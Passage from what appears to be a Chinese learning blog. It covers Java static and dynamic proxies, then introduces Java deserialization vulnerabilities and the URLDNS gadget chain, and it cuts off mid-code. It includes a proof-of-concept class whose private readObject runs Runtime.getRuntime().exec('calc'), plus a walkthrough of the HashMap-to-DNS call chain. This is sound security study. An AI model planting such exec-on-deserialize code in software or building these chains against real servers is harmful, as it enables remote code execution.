‘即它重写的方法即 <code>userProxy.show();</code>有了困惑，为啥这么巧合，代理类中重写方法然后代理类对象调用同名的方法，来实现真实对象的方法的调用</em>（同名对他们的调用有关系？？）（它本质上不就是一个对直接调用的封装吗，那我把它装进代理类中单独写的一个方法不可以吗）</p><p>就进行下面的尝试，在代理类中写一个单独的方法（与实现类调用方法不重名，接口中也没有的），欸！这里要注意创建代理类对象就必须引用类型也是代理类的（或者是接口类的引用类型再强转成代理类的）才 能在后续中调用代理类独有的方法进而调用真正对象的方法，操作之后发现是可以的（具体部分代码如下）但是对比就感觉步骤繁琐了，这两种都重写了接口中的全部方法，但它还再写了一个方法太麻烦了</p><p>部分代理类代码 </p><p>  这里<strong>单独写了一个方法</strong> show2 调用正常真实类的对象的方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserProxy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IUser</span>  &#123;<br>    IUser user;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">UserProxy</span><span class="hljs-params">(IUser user)</span> &#123;<br>        <span class="hljs-built_in">this</span>.user = user;<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">show2</span><span class="hljs-params">()</span> &#123;<br>        user.show();<br>        System.out.println(<span class="hljs-string">&quot;调用了show&quot;</span>);<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">show</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">//user.show();</span><br>     <span class="hljs-comment">// System.out.println(&quot;调用了show&quot;);</span><br>    &#125;<br><br></code></pre></td></tr></table></figure><p>实现类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IUser</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">show</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;展示&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">creat</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;创造&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;update&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jav">//静态代理<br>      UserProxy userProxy = new UserProxy(user);//传进真正的对象<br>       userProxy.show2();<br>       userProxy.creat();<br></code></pre></td></tr></table></figure><p><img src="/2025/04/09/%E9%9D%99%E6%80%81%E4%BB%A3%E7%90%86&&%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/%E8%81%94%E6%83%B3%E6%88%AA%E5%9B%BE_20250407204639-17441621995156-17441622013667.png" alt="联想截图_20250407204639"></p><p><em><strong>所以最后得出结论</strong></em>它们之间的调用与同名无关，同名也是为了看着会清楚，知道这个代理对象调用了这个show方法意味着这个方法show里面会调用真正对象的重名方法show,也体现出接口它规范行为的这么一个作用吧</p><p>就干脆直接在代理类中重写实现类要调的方法，把真正掉的丢进方法里去，代理类调用与真实类的方法同名的方法也就是告诉你最后会调到真实对象的方法</p><hr><p>但静态代理的缺陷：</p><p>接口中每增加一个功能方法，真实类，代理类都也需要重写，导致代码重复</p><hr><p>静态代理用代理类对象调代理类方法来间接调真正类对象的方法，也在代理类中的通过重写方法实现了功能的增强，由此看出在<strong>代理模式</strong>中有两个重要的类，代理类和目标类。<strong>代理类是服务于目标类的</strong>，对其功能进行增强。</p><hr><h3 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h3><ul><li><p>动态代理为了实现方法的增强，具体依赖实现InvocationHandler接口中的invoke方法 实现，invoke方法相当于静态代理中代理类重写的增强功能的方法</p></li><li><p>Proxy创建对象强转后调用方法，会触发实现InvocationHandler接口类的invoke()自动执行（具体在底层）</p></li></ul><h4 id="示例代码-1"><a href="#示例代码-1" class="headerlink" title="示例代码"></a>示例代码</h4><p>接口IUser:</p><p>​ 实现类：UserImpl(真正类)  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IUser</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">show</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;实现类的展示&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">creat</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;创造&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;实现类的update&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>实现接口InvocationHandler的类UserInvocationHandler：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.test;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserInvocationHandler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">InvocationHandler</span> &#123;<br>    IUser user;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">UserInvocationHandler</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">UserInvocationHandler</span><span class="hljs-params">(IUser user)</span> &#123;<br>        <span class="hljs-built_in">this</span>.user = user;<br>    &#125;<br><br>    <span class="hljs-comment">//invoke为了获取到外面调用的方法，得到Method</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable &#123;<br>        System.out.println(<span class="hljs-string">&quot;现在是invoke方法，调用了&quot;</span>+method.getName());<br>        method.invoke(user,args);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>      <span class="hljs-comment">//直接连接调用</span><br>      <span class="hljs-type">IUser</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserImpl</span>();<span class="hljs-comment">//接口类引用指向实现类对象</span><br>      user.show();<br>      <span class="hljs-comment">//user.update();</span><br>      System.out.println(<span class="hljs-string">&quot;====&quot;</span>);<br><br>      <span class="hljs-comment">//静态代理</span><br>      <span class="hljs-comment">//IUser userProxy = new UserProxy(user);//传进真正的对象</span><br>      <span class="hljs-comment">//userProxy.show();</span><br>      <span class="hljs-comment">//userProxy.creat();</span><br><br><br>        <span class="hljs-comment">//动态代理</span><br>        <span class="hljs-type">UserInvocationHandler</span> <span class="hljs-variable">userInvocationHandler</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserInvocationHandler</span>(user);<span class="hljs-comment">//传user,为了调它的方法</span><br>     <span class="hljs-comment">//classloader,要代理的接口，要做的事情 （真正类的加载器，真正类实现的接口，处理器对象）</span><br>        <span class="hljs-type">IUser</span> <span class="hljs-variable">userProxy</span>  <span class="hljs-operator">=</span> (IUser) Proxy.newProxyInstance(user.getClass().getClassLoader(), user.getClass().getInterfaces(), userInvocationHandler);<br>        userProxy.show();<br>        System.out.println(userProxy.getClass());<span class="hljs-comment">//class jdk.proxy1.$Proxy0      userProxy已经是一个代理对象了</span><br>    &#125;<br></code></pre></td></tr></table></figure><p><img src="/2025/04/09/%E9%9D%99%E6%80%81%E4%BB%A3%E7%90%86&&%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/%E8%81%94%E6%83%B3%E6%88%AA%E5%9B%BE_20250408211042-174416227367010.png" alt="联想截图_20250408211042"></p><h4 id="疑问"><a href="#疑问" class="headerlink" title="疑问"></a>疑问</h4><p>？？？？静态代理用代理类对象调代理类方法来间接调真正类对象的方法，动态代理创建代理Proxy类对象后强转成<del>接口类Iuser对象，再用这个Iuser对象调方法</del>。。（那这这这和直接用接口类引用对象调方法有什么区别）（其实这儿不是Iuser对象，是代理对象~~）</p><p>这块的疑问的产生应该是没搞清动态代理的作用和它的底层逻辑咋实现的</p><p>下面参考原文链接：<a href="https://blog.csdn.net/xiao_yao_xian/article/details/146052177">https://blog.csdn.net/xiao_yao_xian/article/details/146052177</a></p><p><a href="https://www.cnblogs.com/gonjan-blog/p/6685611.html">java动态代理实现与原理详细分析 - Gonjian - 博客园</a></p><p>因为代理模式最后都是为了增强方法的功能，在静态代理中有手动创建代理类的比较容易理解，动态代理中我们的<strong>代理类并没有直接的展现在用户面前（它是在底层创建的），但是我们仍可以在调用方法时，获得增强的功能</strong></p><h4 id="底层"><a href="#底层" class="headerlink" title="底层"></a>底层</h4><p>注意：下面接口为ServiceSell，要增强的方法为sell</p><p><strong>一.</strong></p><ul><li><p>Proxy中的重要方法newProxyInstance，可以用来创建代理对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">newProxyInstance</span> <span class="hljs-params">( ClassLoader loader, Class&lt;?&gt;[] interfaces,                                                  InvocationHandler handler)</span>;<br><br></code></pre></td></tr></table></figure><ul><li>参数讲解</li></ul><p>loader：真正类的<strong>类加载器，</strong>通过目标对象的反射可获取</p><p>interfaces：真正类<strong>实现的接口数组</strong>，通过目标对象的反射可获取</p><p>​                 –这个接口相当于静态代理的接口，可以规范行为</p><p>handler：调用处理器，也叫做方法拦截器，<em><strong>传的是一个实现了  InvocationHandler接口的  <code>实现类的</code>对象</strong></em>      它后面会在代理类中用到</p><p>返回对象:经过一系列的操作后，返回的对象就是我们看不见的代理对象，非常重要!!!!!<strong>二中具体学习</strong></p></li><li><p>实现InvocationHandler接口的类中的invoke方法,它通过反射得到具体的方法，并实现了方法功能的增强</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span>;<br></code></pre></td></tr></table></figure></li></ul><p><strong>二.</strong></p><p><strong>通过参考上述文章得到了<u><em>具体的代理类代码</em></u></strong></p><ul><li>代理类的定义</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">jdkProxy</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Proxy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ServiceSell</span><br>                   <span class="hljs-comment">//这里类的名字是上面文章中的文件名</span><br></code></pre></td></tr></table></figure><ul><li><ul><li><p>extends Proxy：<u>继承了代理类Proxy</u></p></li><li><p>implements ServiceSell： 实现了接口。 <em><strong>这儿的接口就是在Proxy类用newInstance创建对象时传的接口参数</strong></em>，这样才可以在<strong>自动生成这个类的时候实现该接口</strong>。</p></li></ul><p>重点理解：和我们静态代理的代理类应该是一样的，因为实现了相同的接口</p><p><em><strong>这也契合了代理模式</strong></em></p></li><li><p>下面就是代理类中获得{要增强的方法}的具体方法，在底层就是通过反射获得了该方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><br><span class="hljs-keyword">static</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        m1 = Class.forName(<span class="hljs-string">&quot;java.lang.Object&quot;</span>).getMethod(<span class="hljs-string">&quot;equals&quot;</span>, Class.forName(<span class="hljs-string">&quot;java.lang.Object&quot;</span>));<br>        m2 = Class.forName(<span class="hljs-string">&quot;java.lang.Object&quot;</span>).getMethod(<span class="hljs-string">&quot;toString&quot;</span>);<br>        m0 = Class.forName(<span class="hljs-string">&quot;java.lang.Object&quot;</span>).getMethod(<span class="hljs-string">&quot;hashCode&quot;</span>);<br>        m3 = Class.forName(<span class="hljs-string">&quot;dynamicproxy.jdk.ServiceSell&quot;</span>).getMethod(<span class="hljs-string">&quot;sell&quot;</span>, Integer.TYPE);<br>    &#125;<br>&#125;<br><br>-理解：我们知道，静态代码块是在类加载时就会执行，分析其执行的业务。<br><br>        从类的结构来看m0,m1,m2...都是Method的对象，表示一个方法<br><br>        这个静态代码块就是获得类的基本方法和根据接口实现的方法<br><br>        我们主要看<span class="hljs-type">m3</span><br><br>        <span class="hljs-variable">m3</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;dynamicproxy.jdk.ServiceSell&quot;</span>).getMethod(<span class="hljs-string">&quot;sell&quot;</span>,         Integer.TYPE);根据这个接口我们得到了ServiceSell接口内的方法，也正是我们真正类的方法(需要增强的方法)，因此我们可以理解m3就是真正类（Factory类）的sell<br><br></code></pre></td></tr></table></figure><p>发现在代理类中是有要增强的方法的</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java">-sell()<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sell</span><span class="hljs-params">(<span class="hljs-type">int</span> var1)</span> <span class="hljs-keyword">throws</span>  &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-built_in">super</span>.h.invoke(<span class="hljs-built_in">this</span>, m3, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;var1&#125;);<br>        &#125; <br>    &#125;<br><br><span class="hljs-built_in">super</span>.h.invoke(<span class="hljs-built_in">this</span>, m3, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;var1&#125;);<br><br></code></pre></td></tr></table></figure><p>上面这是代理类中sell()方法的逻辑</p><p>super.h，在类的定义中，我们知道这个代理类是extends Proxy，所以想要了解这个h是什么，我们进入Proxy源码</p><p><img src="/2025/04/09/%E9%9D%99%E6%80%81%E4%BB%A3%E7%90%86&&%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/%E8%81%94%E6%83%B3%E6%88%AA%E5%9B%BE_20250408214855-17448891189762-17448891207543.png" alt="联想截图_20250408214855"></p><p>发现<strong>它是实现InvocationHandler接口的对象</strong>，而恰好在Proxy用newInstance创建对象时也传进去一个InvocationHandle类的对象！！</p><p><em><strong>所以底层创建的代理类的sell方法（要增强的方法）中调用了InvocationHandle类的对象invoke方法,这个对象就是创建的实现InvocationHandler接口的对象，即示例代码组长讲的实现接口invocationHandler的类中重写的invoke方法，也是上述文章中的内部类方法</strong></em></p><p>误区：<del>调真正被代理的类的方法才触发动态代理类的invoke方法</del></p><p>代理类的具体代码是在底层中，proxy创建返回的就是代理类对象，它调方法就触发动态代理类的invoke方法</p><hr><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p><em><strong>核心</strong></em>：创建出的底层代理类它包含（要增强的）的方法中调用InvocationHandler 对象的invoke方法，创建时传参动态代理类对象—–&gt;帮助我们实现增强方法功能</p><p>我们需要：</p><p>1.创建出底层代理类Proxy.newProxyInstance(类加载器，接口，InvocationHandler 对象)</p><p><em><strong>2 .有一个实现接口InvocationHandler的类，创建出InvocationHandler 对象</strong></em>，他作为参数传进1中去（起连接的一个作用吧）</p><p>3 .重写invoke方法，在里面调用方法（使用反射的形式），并实现功能增强</p><ul><li>接口：底层代理类会实现这个接口(契合代理模式)，<em><strong>且底层代理类中也会有接口中的方法（由反射获得），方法里面是调InvocationHandler对象的invoke</strong></em></li><li>InvocationHandler 对象：&#x3D;&#x3D;底层代理类包含的方法会调用InvocationHandler 对象的invoke方法，要是不传这个参数就没办法后续利用增强功能&#x3D;&#x3D;（具体它其实是传到Proxy构造器了，然后代理类又是Proxy的子类，所以代理类方法中调invoke方法通过它就能拿出来利用了，去增强功能）</li></ul><p>注意：Proxy.newProxyInstance(…)返回对象强转后是代理类型的（class jdk.proxy1.$Proxy0） </p><p>所以执行流程：</p><p>代理类对象调用方法—–&gt;到底层代理类方法中调用InvocationHandler对象的invoke方法—–&gt;到我们自己写的实现接口InvocationHandler的类中的invoke方法——&gt;在invoke()中调用目标类的方法，并实现功能的增强</p><hr><h4 id="在反序列化中的一个作用"><a href="#在反序列化中的一个作用" class="headerlink" title="在反序列化中的一个作用"></a>在反序列化中的一个作用</h4><p>正常的话，这个O任意类型调目标方法：</p><p>A[O]-&gt;O.f 往A中传B即可实现调B的f</p><p>当这个O是<strong>动态代理类</strong>（实现接口InvocationHandler的）,O它<strong>调的是别的方法不是目标方法</strong>时：</p><p>A[O]—-&gt;O.abc(虽然不是调的目标方法但这儿会触发O的invoke方法)</p><p>O[B]代理类传进去参数B—-&gt;invoke中调B.f  在invoke中增强功能，调目标f方法</p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>概述&amp;&amp;URLDNS</title>
    <link href="/2025/04/02/%E6%A6%82%E8%BF%B0&amp;&amp;URLDNS/"/>
    <url>/2025/04/02/%E6%A6%82%E8%BF%B0&amp;&amp;URLDNS/</url>
    
    <content type="html"><![CDATA[<p>反序列化&amp;&amp;URLDNS</p><span id="more"></span><h3 id="概述序列化与反序列化"><a href="#概述序列化与反序列化" class="headerlink" title="概述序列化与反序列化"></a>概述序列化与反序列化</h3><ul><li><p>Java序列化就是把Java对象转换为字节序列的过程（保存值和数据类型），而Java反序列化就是把字节序列恢复为Java对象的过程（恢复值和数据类型）</p></li><li><p>若要让某个对象支持序列化机制，则必须让其类是可序列化的：即该类必须实现如下两个接口之一：</p><p>Serializable   它里面没有任何方法，是一个标记接口</p><p>Externalizable 该接口有方法要实现，因此推荐第一个</p></li><li><p>为什么产生安全问题：</p><p>只要服务段反序列化数据，客户端传递类的readObject会自动执行，给予攻击者在服务器上运行代码的能力</p></li></ul><h4 id="可能的形式"><a href="#可能的形式" class="headerlink" title="可能的形式"></a>可能的形式</h4><ol><li><p>入口类的readObject,直接调用危险方法（<em><strong>private 定义 readObject方法</strong></em>）</p><p>person 中定义代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream ois)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>       ois.defaultReadObject();<br>       Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>   &#125;<br></code></pre></td></tr></table></figure><p>序列化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SerializableTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(o);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;xiao&quot;</span>,<span class="hljs-number">18</span>,<span class="hljs-number">01</span>);<br>        serialize(person);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>反序列化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserializableTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        ObjectInputStream oos=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        Object ob=oos.readObject();<br>        <span class="hljs-keyword">return</span> ob;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>      Person person=  (Person)unserialize();<br>        System.out.println(person);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><em><strong>这里为什么Person中（有点类比重写的）这个readObject,方法必须是private属性的？还有为什么能在执行反序列化代码后能调用它，并执行它的代码呢？？</strong></em></p><p>（在序列化（反序列化）的时候，ObjectOutputStream（ObjectInputStream）会寻找目标类中的私有的writeObject（readObject）方法，赋值给变量writeObjectMethod（readObjectMethod）。）</p><ul><li><p>重写<code>readObject()</code>方法，并不是说重写父类中的方法，而是我们自定义了一个private修饰的<code>readObject()</code>方法，在反序列化的过程中检测到我们程序中存在private修饰的<code>readObject()</code>方法，就会去调用我们自定义的<code>readObject()</code>方法</p></li><li><p>总结：如果目标类中没有定义私有的writeObject或readObject方法，那么序列化和反序列化的时候将<strong>调用默认的方法</strong>来根据目标类中的属性来进行序列化和反序列化，而如果目标类中定义了私有的writeObject或readObject方法，那么序列化和反序列化的时候将调用<strong>目标类中指定的</strong>writeObject或readObject方法来实现。</p></li></ul><p>参考：<a href="https://xz.aliyun.com/news/13981?time__1311=eqUxuDcDgGBADODlxGrFDn7DB7D9AnrGB1oD&u_atoken=352634068527f4b4383603b030cddcfd&u_asig=0a472f9017438369825541851e0035">重写的readObject()权限修饰符为什么不能是public-先知社区</a></p></li><li><p>入口类参数中包含可控类，该类有危险方法，readObject时调用套用的第二层类</p></li><li><p>入口类参数中包含可控类，该类又调用其他又危险方法的类，readObject时调用</p></li><li><p>构造函数&#x2F;静态代码块等类加载时隐式执行</p></li></ol><p>共同条件 继承Serializable</p><p>入口类 source(重写readObject 参数类型宽泛  最好jdk自带)</p><p>（直接在类里面向上面的1.那样直接写不太现实，在类里面套一个类并且最好还是Object类的）在readObject中调用一个常见的函数（每一个对象都会调用的比如toString,hashcode）还是jdk自带的。hashMap就是一个符合条件的</p><h3 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h3><h4 id="入口类的条件"><a href="#入口类的条件" class="headerlink" title="入口类的条件"></a>入口类的条件</h4><p>HashMap能够作为入口类的条件：</p><ul><li><p>HashMap 实现类 implements Map, Serializable</p></li><li><p>接受的类型也比较多：因为需要接受键和值</p></li><li><p>重写readObject:  它要保证键的唯一性，当键是对象时需要重新写readOject方法来计算唯一性</p></li></ul><h4 id="readObject-最后实现URL发送dns请求"><a href="#readObject-最后实现URL发送dns请求" class="headerlink" title="readObject 最后实现URL发送dns请求"></a>readObject 最后实现URL发送dns请求</h4><ul><li><p>第一部分:入口类HashMap的readObject调用入口类HashMap的hash方法计算key的hashCode ,再调  key 的hashCode（调了两下，一下调到自己的hash,一下调到  key的hashCode）,而key是我们传入的URL对象，最后就跳转成了调用URL的hashCode</p><p><em><strong>HashMap readObject—&gt;HashMap hash—-&gt; key  hashCode(即URL 的hashCode)</strong></em></p></li><li><p>第二部分:URL的hashCode在计算时会调用getHostAddress来解析域名发送dns</p><p><em><strong>URL.hashCode()—&gt;URLStreamHander.hashCode()—&gt;URL.getHostAddress()—&gt;InetAddress-&gt;getByName()</strong></em></p></li></ul><h4 id="具体过程"><a href="#具体过程" class="headerlink" title="具体过程"></a>具体过程</h4><p>从入口类HashMap的readObject出发</p><p>第一下：看最后面 调HashMap的hash方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 